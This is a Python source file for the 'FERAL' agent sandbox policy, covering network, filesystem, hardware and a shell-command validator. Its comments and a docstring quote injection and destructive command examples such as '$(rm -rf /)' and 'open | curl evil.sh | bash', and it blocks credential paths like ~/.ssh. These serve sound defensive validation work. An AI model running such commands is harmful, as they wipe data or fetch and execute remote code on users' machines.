"""
FERAL Sandbox Policies — Declarative Security for Hardware + Software
=======================================================================
NemoClaw uses YAML policies for network/filesystem sandboxing.
FERAL extends this to HARDWARE — you can declare what a device is
allowed to do, what sensors can be read, what actuators can move,
and at what rate.

This is the missing piece in every other agent system:
  NemoClaw can sandbox which URLs a process can reach.
  FERAL can sandbox which direction a robot arm can move.

Policy file: ~/.feral/policies/default.yaml (or per-device)
"""

from __future__ import annotations
import json
import logging
import os
import time
from pathlib import Path
from typing import Optional, Any

from config.loader import feral_home

logger = logging.getLogger("feral.sandbox_policy")

_GRANTS_FILE = "workspace_grants.json"


class SandboxPolicy:
    """
    Declarative security policy that governs what agents and devices can do.
    Loaded from YAML/dict configuration.
    """

    def __init__(self, policy_data: Optional[dict] = None):
        self._data = policy_data or self._default_policy()

    @staticmethod
    def _default_policy() -> dict:
        return {
            "version": "1.0",
            "name": "default",
            "description": "FERAL default safety policy",

            "permissions": {
                "max_tier": "active",
                "require_confirmation_above": "active",
                "auto_approve_categories": ["sensor", "display"],
            },

            "network": {
                "mode": "allowlist",
                "allowed_domains": [
                    "api.openai.com",
                    "api.anthropic.com",
                    "generativelanguage.googleapis.com",
                    "api.tavily.com",
                    "api.github.com",
                    "*.supabase.co",
                ],
                "blocked_domains": [],
                "max_requests_per_minute": 60,
            },

            "filesystem": {
                "read_paths": [
                    "~/.feral/",
                    "/tmp/feral/",
                ],
                "write_paths": [
                    "~/.feral/skills/",
                    "~/.feral/memory/",
                    "/tmp/feral/",
                ],
                "blocked_paths": [
                    "~/.ssh/",
                    "~/.aws/",
                    "~/.gnupg/",
                ],
            },

            "hardware": {
                "sensors": {
                    "allowed": ["heart_rate", "spo2", "temperature", "uv", "steps",
                                "accelerometer", "gyroscope", "ambient_light", "gps",
                                "telemetry"],
                    "blocked": [],
                    "max_read_rate_per_second": {
                        "heart_rate": 1,
                        "spo2": 0.1,
                        "temperature": 0.05,
                        "gps": 0.2,
                    },
                },
                "actuators": {
                    "allowed": ["display", "speaker", "haptic", "led"],
                    "blocked": [],
                    "requires_confirmation": ["motor", "servo", "relay", "lock", "valve"],
                    "max_actions_per_minute": 30,
                },
                "cameras": {
                    "allowed": True,
                    "max_captures_per_minute": 6,
                    "auto_analyze": True,
                    "store_frames": False,
                },
                "movement": {
                    "max_speed_pct": 50,
                    "restricted_zones": [],
                    "emergency_stop_enabled": True,
                    "requires_confirmation_above_speed": 30,
                },
            },

            "skills": {
                "allow_generation": True,
                "require_approval": True,
                "max_pending": 10,
                "blocked_skill_ids": [],
                "rate_limits": {},
            },

            "memory": {
                "allow_persistent_storage": True,
                "allow_knowledge_graph": True,
                "max_notes": 10000,
                "max_episodes": 5000,
                "auto_forget_after_days": None,
            },

            "mcp": {
                "allow_external_servers": True,
                "allowed_servers": [],
                "blocked_servers": [],
                "max_concurrent_connections": 5,
            },

            "execution": {
                "max_tool_calls_per_turn": 20,
                "max_total_actions_per_session": 200,
                "timeout_per_action_ms": 30000,
                # Desktop brain default; allowlist + metachar reject in validate_shell_command provides the safety surface.
                "allow_shell_commands": True,
                "allow_file_write": False,
                "allow_network_requests": True,
            },

            # audit-r12 A3 (v2026.5.38) — ``daemon://local/shell`` enforcement.
            # The pre-fix executor accepted any string with a substring
            # blocklist (``"rm "``, ``"sudo "``, …) and forwarded it to
            # ``subprocess.run(shell=True)``. That is trivially bypassable —
            # ``$(rm -rf /)`` does not contain the literal ``"rm "`` substring
            # the blocklist scans for, and ``rm$IFS-rf$IFS/`` defeats word-
            # boundary checks. The replacement is an explicit program
            # allowlist that must match the first argv token after shlex
            # parsing; everything else is rejected. Lane 05 wires
            # ``validate_shell_command()`` into ``skills/executor.py``.
            # v2026.5.42 — daemon shell allowlist expanded to cover vetted
            # macOS staples that the pre-fix substring blocklist used to let
            # through. Every entry below is a non-destructive program that
            # does not require sudo, does not write outside its argv
            # contract, and was implicitly trusted under the legacy
            # blocklist. ``validate_shell_command`` still rejects shell
            # metacharacters ($ ` | & ; > < \\n \\r \\) so an allowlisted
            # binary cannot smuggle a different program through (e.g.
            # ``say "$(rm -rf /)"`` rejects on the metachar check before the
            # argv[0] check).
            "daemon": {
                "shell": {
                    "allowed_commands": [
                        # Original audit-r12 A3 triple
                        "open",
                        "osascript",
                        "screencapture",
                        # v2026.5.42 vetted macOS staples
                        "say",            # text-to-speech (demo + notification surface)
                        "pbcopy",         # write to clipboard
                        "pbpaste",        # read from clipboard
                        "defaults",       # read/write user defaults (system-settings skill)
                        "system_profiler", # hardware/software inventory (read-only)
                        "sw_vers",        # OS version (read-only)
                        "caffeinate",     # prevent sleep (long-running task UX)
                        "mdfind",         # Spotlight query (read-only)
                        "date",           # current date (read-only)
                        "uname",          # system info (read-only)
                    ],
                },
            },

            "wasm": {
                "enabled": True,
                "memory_limit_mb": 64,
                "timeout_seconds": 5,
                "fuel_limit": 1_000_000,
                "allowed_host_functions": [
                    "feral_log",
                    "feral_get_param",
                    "feral_set_result",
                    "feral_http_get",
                    "feral_http_post",
                ],
                "allowed_domains": [
                    "api.openai.com",
                    "api.tavily.com",
                ],
            },
        }

    @classmethod
    def load_from_file(cls, path: str) -> "SandboxPolicy":
        """Load a policy from a YAML or JSON file."""
        file_path = Path(path)
        if not file_path.exists():
            logger.info(f"Policy file not found, using defaults: {path}")
            return cls()

        import json
        if file_path.suffix in (".yaml", ".yml"):
            try:
                import yaml
                with open(file_path) as f:
                    data = yaml.safe_load(f)
            except ImportError:
                logger.warning("PyYAML not installed, falling back to JSON")
                return cls()
        else:
            with open(file_path) as f:
                data = json.load(f)

        return cls(data)

    @classmethod
    def load_default(cls) -> "SandboxPolicy":
        policy_dir = feral_home() / "policies"
        for name in ["default.yaml", "default.yml", "default.json"]:
            p = policy_dir / name
            if p.exists():
                return cls.load_from_file(str(p))
        return cls()

    # ─────────────────────────────────────────
    # Permission Checks
    # ─────────────────────────────────────────

    def can_use_tier(self, tier: str) -> bool:
        from security.vault import PermissionTier
        max_tier = self._data.get("permissions", {}).get("max_tier", "active")
        return PermissionTier.tier_level(tier) <= PermissionTier.tier_level(max_tier)

    def needs_confirmation(self, tier: str) -> bool:
        from security.vault import PermissionTier
        threshold = self._data.get("permissions", {}).get("require_confirmation_above", "active")
        return PermissionTier.tier_level(tier) > PermissionTier.tier_level(threshold)

    # ─────────────────────────────────────────
    # Filesystem Path Enforcement
    # ─────────────────────────────────────────

    def _resolve(self, raw_path: str) -> Path:
        return Path(raw_path).expanduser().resolve()

    def _path_in_list(self, target: Path, patterns: list[str]) -> bool:
        for pat in patterns:
            p = self._resolve(pat)
            try:
                target.relative_to(p)
                return True
            except ValueError:
                continue
        return False

    def _load_grants(self) -> dict:
        gf = feral_home() / _GRANTS_FILE
        if gf.exists():
            try:
                return json.loads(gf.read_text())
            except Exception:
                return {}
        return {}

    def _save_grants(self, grants: dict) -> None:
        gf = feral_home() / _GRANTS_FILE
        gf.parent.mkdir(parents=True, exist_ok=True)
        gf.write_text(json.dumps(grants, indent=2))

    def can_read_path(self, raw_path: str) -> bool:
        target = self._resolve(raw_path)
        fs = self._data.get("filesystem", {})
        if self._path_in_list(target, fs.get("blocked_paths", [])):
            return False
        if self._path_in_list(target, fs.get("read_paths", [])):
            return True
        if self._path_in_list(target, fs.get("write_paths", [])):
            return True
        grants = self._load_grants()
        for folder, info in grants.items():
            try:
                target.relative_to(self._resolve(folder))
                return True
            except ValueError:
                continue
        return False

    def can_write_path(self, raw_path: str) -> bool:
        target = self._resolve(raw_path)
        fs = self._data.get("filesystem", {})
        if self._path_in_list(target, fs.get("blocked_paths", [])):
            return False
        if self._path_in_list(target, fs.get("write_paths", [])):
            return True
        grants = self._load_grants()
        for folder, info in grants.items():
            try:
                target.relative_to(self._resolve(folder))
                if info.get("mode") in ("readwrite", "write"):
                    return True
            except ValueError:
                continue
        return False

    def grant_folder(self, raw_path: str, mode: str = "read") -> dict:
        target = self._resolve(raw_path)
        fs = self._data.get("filesystem", {})
        if self._path_in_list(target, fs.get("blocked_paths", [])):
            return {"ok": False, "error": "Path is in blocked list"}
        grants = self._load_grants()
        grants[str(target)] = {
            "mode": mode,
            "granted_at": time.time(),
        }
        self._save_grants(grants)
        logger.info("Folder grant: %s mode=%s", target, mode)
        return {"ok": True, "path": str(target), "mode": mode}

    def revoke_folder(self, raw_path: str) -> bool:
        target = self._resolve(raw_path)
        grants = self._load_grants()
        key = str(target)
        if key in grants:
            del grants[key]
            self._save_grants(grants)
            return True
        return False

    def list_grants(self) -> list[dict]:
        grants = self._load_grants()
        return [
            {"path": k, "mode": v.get("mode", "read"), "granted_at": v.get("granted_at")}
            for k, v in grants.items()
        ]

    # ─────────────────────────────────────────
    # Network Checks
    # ─────────────────────────────────────────

    def can_access_domain(self, domain: str) -> bool:
        net = self._data.get("network", {})
        blocked = net.get("blocked_domains", [])
        if any(self._domain_match(domain, b) for b in blocked):
            return False
        mode = net.get("mode", "allowlist")
        if mode == "allowlist":
            allowed = net.get("allowed_domains", [])
            return any(self._domain_match(domain, a) for a in allowed)
        return True

    # ─────────────────────────────────────────
    # Hardware Checks
    # ─────────────────────────────────────────

    def can_read_sensor(self, sensor_type: str) -> bool:
        hw = self._data.get("hardware", {}).get("sensors", {})
        blocked = hw.get("blocked", [])
        if sensor_type in blocked:
            return False
        allowed = hw.get("allowed", [])
        return sensor_type in allowed or not allowed

    def can_use_actuator(self, actuator_type: str) -> tuple[bool, bool]:
        """Returns (allowed, needs_confirmation)."""
        hw = self._data.get("hardware", {}).get("actuators", {})
        blocked = hw.get("blocked", [])
        if actuator_type in blocked:
            return False, False
        needs_confirm = actuator_type in hw.get("requires_confirmation", [])
        allowed = hw.get("allowed", [])
        is_allowed = actuator_type in allowed or not allowed
        return is_allowed, needs_confirm

    def max_movement_speed(self) -> int:
        return self._data.get("hardware", {}).get("movement", {}).get("max_speed_pct", 50)

    def emergency_stop_enabled(self) -> bool:
        """Whether the host-side dead-man watchdog may issue an automatic
        halt to a motion-capable device on command timeout, link loss, or
        brain shutdown. Mirrors ``hardware.movement.emergency_stop_enabled``
        and defaults to True so the safety behavior is on unless a policy
        explicitly disables it."""
        movement = self._data.get("hardware", {}).get("movement", {})
        return bool(movement.get("emergency_stop_enabled", True))

    def can_capture_camera(self) -> bool:
        return self._data.get("hardware", {}).get("cameras", {}).get("allowed", True)

    # ─────────────────────────────────────────
    # Skill Checks
    # ─────────────────────────────────────────

    def can_generate_skills(self) -> bool:
        return self._data.get("skills", {}).get("allow_generation", True)

    def skill_requires_approval(self) -> bool:
        return self._data.get("skills", {}).get("require_approval", True)

    def is_skill_blocked(self, skill_id: str) -> bool:
        blocked = self._data.get("skills", {}).get("blocked_skill_ids", [])
        return skill_id in blocked

    # ─────────────────────────────────────────
    # MCP Checks
    # ─────────────────────────────────────────

    def can_use_mcp_server(self, server_name: str) -> bool:
        mcp = self._data.get("mcp", {})
        if not mcp.get("allow_external_servers", True):
            return False
        blocked = mcp.get("blocked_servers", [])
        if server_name in blocked:
            return False
        allowed = mcp.get("allowed_servers", [])
        return not allowed or server_name in allowed

    # ─────────────────────────────────────────
    # Execution Checks
    # ─────────────────────────────────────────

    def can_execute_shell(self) -> bool:
        return self._data.get("execution", {}).get("allow_shell_commands", False)

    def max_tool_calls_per_turn(self) -> int:
        return self._data.get("execution", {}).get("max_tool_calls_per_turn", 20)

    # ─────────────────────────────────────────
    # Daemon shell allowlist (audit-r12 A3)
    # ─────────────────────────────────────────

    # Metacharacters that turn ``subprocess.run(shell=True)`` into a generic
    # shell interpreter. ``$(...)`` / ``\`...\``` smuggle commands; ``|`` /
    # ``&`` / ``;`` chain them; ``>`` / ``<`` redirect; ``\\`` and unbalanced
    # quotes evade shlex. Any of these is an automatic reject — even when
    # the first token would otherwise be allowlisted — because we cannot
    # statically reason about the resulting process tree.
    _SHELL_REJECT_CHARS: tuple[str, ...] = (
        "$", "`", "|", "&", ";", ">", "<", "\n", "\r", "\\",
    )

    def daemon_shell_allowlist(self) -> list[str]:
        """Return the configured argv[0] program allowlist for
        ``daemon://local/shell``.

        Defaults to ``["open", "osascript", "screencapture"]`` (the same
        triple the canonical ``agentic_computer_use`` shell action permits).
        Operators override via the policy file at
        ``daemon.shell.allowed_commands``.
        """
        raw = (
            self._data.get("daemon", {})
            .get("shell", {})
            .get("allowed_commands", [])
        )
        if not isinstance(raw, list):
            return []
        return [str(p).strip().lower() for p in raw if str(p).strip()]

    def validate_shell_command(self, command: str) -> tuple[bool, str]:
        """Decide whether a ``daemon://local/shell`` invocation is safe.

        Returns ``(ok, reason)``. ``ok=True`` means the command's first
        token is in :meth:`daemon_shell_allowlist` AND the command
        contains no shell-meaningful metacharacters that would smuggle
        a different program past the allowlist (e.g. ``$(rm -rf /)``,
        ``open; rm -rf ~``, ``open | curl evil.sh | bash``,
        ``open && wipe``, backtick command substitution, redirects).
        ``ok=False`` returns a one-line operator-facing reason.

        Lane 05 wires this into ``skills/executor.py`` so the daemon
        path no longer reaches ``subprocess.run(shell=True)`` with a
        free-form string — the executor now resolves the allowlisted
        program path, splits the remaining argv with ``shlex.split``,
        and execs without a shell.
        """
        if not isinstance(command, str):
            return False, "command must be a string"
        stripped = command.strip()
        if not stripped:
            return False, "empty command"

        for ch in self._SHELL_REJECT_CHARS:
            if ch in stripped:
                return False, (
                    f"shell metacharacter {ch!r} not permitted on "
                    f"daemon://local/shell — chain via separate calls "
                    f"or route to ``computer_use__bash`` (sandboxed)"
                )

        try:
            import shlex
            parts = shlex.split(stripped, comments=False, posix=True)
        except ValueError as exc:
            return False, f"could not parse command ({exc}); reject"

        if not parts:
            return False, "empty argv after parsing"

        from pathlib import Path as _P
        head = _P(parts[0]).name.lower()
        allow = self.daemon_shell_allowlist()
        if head not in allow:
            return False, (
                f"program {parts[0]!r} not in daemon shell allowlist "
                f"({', '.join(allow) or '(empty)'})"
            )

        if not self.can_execute_shell():
            return False, (
                "daemon shell is disabled by policy "
                "(execution.allow_shell_commands=false)"
            )
        return True, ""

    # ─────────────────────────────────────────
    # Utils
    # ─────────────────────────────────────────

    @staticmethod
    def _domain_match(domain: str, pattern: str) -> bool:
        if pattern.startswith("*."):
            return domain.endswith(pattern[1:]) or domain == pattern[2:]
        return domain == pattern

    def to_dict(self) -> dict:
        return self._data

    def save(self, path: Optional[str] = None):
        import json
        if path is None:
            p = feral_home() / "policies" / "default.json"
        else:
            p = Path(path)
        p.parent.mkdir(parents=True, exist_ok=True)
        with open(p, "w") as f:
            json.dump(self._data, f, indent=2)
        logger.info(f"Policy saved: {p}")
